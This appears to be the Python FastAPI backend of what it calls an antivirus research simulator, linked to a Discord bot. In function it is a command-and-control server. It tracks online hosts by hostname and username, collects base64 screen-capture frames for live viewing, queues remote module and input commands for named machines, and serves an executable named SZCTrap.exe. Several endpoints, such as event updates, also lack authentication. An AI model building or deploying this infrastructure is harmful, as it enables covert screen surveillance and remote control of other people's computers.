import json
import os
from contextlib import asynccontextmanager
from typing import Optional

from fastapi import FastAPI, Header, HTTPException, Query, Request
from fastapi.middleware.cors import CORSMiddleware
from fastapi.responses import Response
from pydantic import BaseModel, Field

import storage


class EventCreate(BaseModel):
    module: str
    action: str
    status: str = Field(description="success | failed | blocked | simulated")
    detected: bool = False
    blocked: bool = False
    payload: Optional[dict] = None
    error_message: Optional[str] = None
    session_id: Optional[str] = None


class SessionCreate(BaseModel):
    id: str
    label: Optional[str] = None


class DetectionUpdate(BaseModel):
    detected: Optional[bool] = None
    blocked: Optional[bool] = None


class GuildWatchState(BaseModel):
    channel_id: int
    last_event_id: int = 0
    alert_role_id: Optional[int] = None
    alert_on_start: bool = True
    alert_on_blocked: bool = True
    alert_on_online: bool = True
    alert_on_offline: bool = True
    control_channel_id: Optional[int] = None


class HeartbeatCreate(BaseModel):
    hostname: str
    username: str = ""
    screen_width: Optional[int] = None
    screen_height: Optional[int] = None


class LiveviewFramePut(BaseModel):
    hostname: str
    payload: dict


class LiveviewSet(BaseModel):
    hostname: str
    enabled: bool
    interval: float = 3.0
    quality: str = "balanced"
    guild_id: Optional[str] = None


class RemoteCommandCreate(BaseModel):
    hostname: str
    guild_id: Optional[str] = None
    module: Optional[str] = None
    command_kind: str = "module"
    payload: Optional[dict] = None


class GuildWatchesSync(BaseModel):
    watches: dict[str, GuildWatchState]


@asynccontextmanager
async def lifespan(_: FastAPI):
    await storage.init_db()
    yield


app = FastAPI(
    title="AntiVirus API",
    description="Event API for AV research simulator, website, and Discord bot",
    lifespan=lifespan,
)

_wildcard = storage.CORS_ORIGINS == ["*"]
app.add_middleware(
    CORSMiddleware,
    allow_origins=["*"] if _wildcard else storage.CORS_ORIGINS,
    allow_credentials=not _wildcard,
    allow_methods=["*"],
    allow_headers=["*"],
)


@app.get("/api/health")
async def health():
    return {
        "status": "ok",
        "service": "antivirus-api",
        "storage": storage.backend_name(),
    }


@app.post("/api/sessions")
async def create_session(body: SessionCreate, x_api_key: Optional[str] = Header(None)):
    if not storage.verify_simulator_key(x_api_key):
        raise HTTPException(status_code=401, detail="Unauthorized")
    return await storage.create_session(body.id, body.label)


@app.patch("/api/sessions/{session_id}/finish")
async def finish_session(session_id: str, x_api_key: Optional[str] = Header(None)):
    if not storage.verify_simulator_key(x_api_key):
        raise HTTPException(status_code=401, detail="Unauthorized")
    await storage.finish_session(session_id)
    return {"id": session_id, "finished": True}


@app.get("/api/sessions/{session_id}")
async def get_session(session_id: str, x_api_key: Optional[str] = Header(None)):
    if not storage.verify_bot_key(x_api_key):
        raise HTTPException(status_code=401, detail="Bot API key required")
    session = await storage.get_session(session_id)
    if not session:
        raise HTTPException(status_code=404, detail="Session not found")
    return session


@app.post("/api/events")
async def create_event(body: EventCreate, x_api_key: Optional[str] = Header(None)):
    if not storage.verify_simulator_key(x_api_key):
        raise HTTPException(status_code=401, detail="Unauthorized")
    event = await storage.add_event(body.model_dump())
    return {"id": event["id"], "created_at": event["created_at"]}


@app.get("/api/events")
async def list_events(
    session_id: Optional[str] = None,
    since_id: Optional[int] = Query(None),
    limit: int = 200,
    x_api_key: Optional[str] = Header(None),
):
    if since_id is not None and not storage.verify_bot_key(x_api_key):
        raise HTTPException(status_code=401, detail="Bot API key required for polling")
    return await storage.list_events(session_id, since_id, limit)


@app.get("/api/events/{event_id}")
async def get_event(event_id: int):
    event = await storage.get_event(event_id)
    if not event:
        raise HTTPException(status_code=404, detail="Event not found")
    return event


@app.patch("/api/events/{event_id}")
async def update_detection(event_id: int, body: DetectionUpdate):
    event = await storage.update_event(event_id, body.detected, body.blocked)
    if not event:
        raise HTTPException(status_code=404, detail="Event not found")
    return event


@app.get("/api/stats")
async def get_stats(session_id: Optional[str] = None):
    return await storage.get_stats(session_id)


@app.delete("/api/events")
async def clear_events(session_id: Optional[str] = None, x_api_key: Optional[str] = Header(None)):
    if not storage.verify_simulator_key(x_api_key):
        raise HTTPException(status_code=401, detail="Unauthorized")
    await storage.clear_events(session_id)
    return {"cleared": True}


@app.get("/api/bot/watches")
async def get_bot_watches(x_api_key: Optional[str] = Header(None)):
    if not storage.verify_bot_key(x_api_key):
        raise HTTPException(status_code=401, detail="Bot API key required")
    watches = await storage.get_guild_watches()
    return {"watches": watches}


@app.put("/api/bot/watches")
async def sync_bot_watches(body: GuildWatchesSync, x_api_key: Optional[str] = Header(None)):
    if not storage.verify_bot_key(x_api_key):
        raise HTTPException(status_code=401, detail="Bot API key required")
    payload = {
        gid: {
            "channel_id": w.channel_id,
            "last_event_id": w.last_event_id,
            "alert_role_id": w.alert_role_id,
            "alert_on_start": w.alert_on_start,
            "alert_on_blocked": w.alert_on_blocked,
            "alert_on_online": w.alert_on_online,
            "alert_on_offline": w.alert_on_offline,
            "control_channel_id": w.control_channel_id,
        }
        for gid, w in body.watches.items()
    }
    await storage.sync_guild_watches(payload)
    return {"saved": len(payload)}


@app.post("/api/heartbeat")
async def post_heartbeat(body: HeartbeatCreate, x_api_key: Optional[str] = Header(None)):
    if not storage.verify_simulator_key(x_api_key):
        raise HTTPException(status_code=401, detail="Unauthorized")
    await storage.upsert_heartbeat(
        body.hostname,
        body.username,
        body.screen_width,
        body.screen_height,
    )
    return {"ok": True}


@app.put("/api/simulator/release")
async def upload_simulator_release(
    request: Request,
    x_api_key: Optional[str] = Header(None),
):
    if not storage.verify_simulator_key(x_api_key):
        raise HTTPException(status_code=401, detail="Unauthorized")
    data = await request.body()
    try:
        meta = await storage.upsert_simulator_release(data)
    except ValueError as exc:
        raise HTTPException(status_code=400, detail=str(exc)) from exc
    return {"ok": True, **meta}


@app.get("/api/simulator/release")
async def simulator_release_info():
    """Hash + download info — clients compare sha256, no manual version numbers."""
    meta = await storage.get_simulator_release_meta()
    if meta:
        return {"hosted": True, "sha256": meta["sha256"], "size": meta["size"]}
    url = os.getenv("SIMULATOR_RELEASE_URL", "").strip()
    if url:
        return {"hosted": False, "url": url, "sha256": None, "size": None}
    return {"hosted": False, "sha256": None, "size": None}


@app.get("/api/simulator/download")
async def download_simulator_release(x_api_key: Optional[str] = Header(None)):
    if not storage.verify_simulator_key(x_api_key):
        raise HTTPException(status_code=401, detail="Unauthorized")
    data = await storage.get_simulator_release_bytes()
    if not data:
        raise HTTPException(status_code=404, detail="No release uploaded yet")
    return Response(
        content=data,
        media_type="application/octet-stream",
        headers={"Content-Disposition": 'attachment; filename="SZCTrap.exe"'},
    )


@app.get("/api/liveview")
async def get_liveview_state(
    hostname: str,
    x_api_key: Optional[str] = Header(None),
):
    if not storage.verify_simulator_key(x_api_key):
        raise HTTPException(status_code=401, detail="Unauthorized")
    return await storage.get_liveview(hostname)


@app.put("/api/liveview/frame")
async def push_liveview_frame(body: LiveviewFramePut, x_api_key: Optional[str] = Header(None)):
    if not storage.verify_simulator_key(x_api_key):
        raise HTTPException(status_code=401, detail="Unauthorized")
    if not body.payload.get("image_base64"):
        raise HTTPException(status_code=400, detail="image_base64 required")
    event = await storage.upsert_liveview_frame(body.hostname, body.payload)
    return {"ok": True, "frame_id": event["id"]}


@app.put("/api/bot/liveview")
async def set_liveview_state(body: LiveviewSet, x_api_key: Optional[str] = Header(None)):
    if not storage.verify_bot_key(x_api_key):
        raise HTTPException(status_code=401, detail="Bot API key required")
    return await storage.set_liveview(
        body.hostname, body.enabled, body.interval, body.guild_id, body.quality
    )


@app.get("/api/commands/pending")
async def get_pending_commands(
    hostname: str,
    x_api_key: Optional[str] = Header(None),
):
    if not storage.verify_simulator_key(x_api_key):
        raise HTTPException(status_code=401, detail="Unauthorized")
    return await storage.list_pending_commands(hostname)


@app.post("/api/commands/{command_id}/complete")
async def complete_command(command_id: int, x_api_key: Optional[str] = Header(None)):
    if not storage.verify_simulator_key(x_api_key):
        raise HTTPException(status_code=401, detail="Unauthorized")
    ok = await storage.complete_remote_command(command_id)
    if not ok:
        raise HTTPException(status_code=404, detail="Command not found")
    return {"completed": True}


@app.post("/api/bot/commands")
async def queue_remote_command(body: RemoteCommandCreate, x_api_key: Optional[str] = Header(None)):
    if not storage.verify_bot_key(x_api_key):
        raise HTTPException(status_code=401, detail="Bot API key required")
    kind = body.command_kind or "module"
    if kind == "module" and not body.module:
        raise HTTPException(status_code=400, detail="module is required for module commands")
    if kind == "input" and not body.payload:
        raise HTTPException(status_code=400, detail="payload is required for input commands")
    try:
        cmd = await storage.create_remote_command(
            body.hostname,
            body.guild_id,
            module=body.module,
            command_kind=kind,
            payload=body.payload,
        )
    except ValueError as exc:
        raise HTTPException(status_code=400, detail=str(exc)) from exc
    return cmd


@app.get("/api/bot/online")
async def list_online(
    minutes: int = Query(3, ge=1, le=30),
    x_api_key: Optional[str] = Header(None),
):
    if not storage.verify_bot_key(x_api_key):
        raise HTTPException(status_code=401, detail="Bot API key required")
    hosts = await storage.list_online_hosts(minutes)
    return {"hosts": hosts, "minutes": minutes}


@app.get("/api/bot/liveview/latest")
async def latest_liveview(
    hostname: str,
    since_id: Optional[int] = Query(None),
    x_api_key: Optional[str] = Header(None),
):
    if not storage.verify_bot_key(x_api_key):
        raise HTTPException(status_code=401, detail="Bot API key required")
    event = await storage.latest_liveview_event(hostname, since_id)
    return {"event": event}
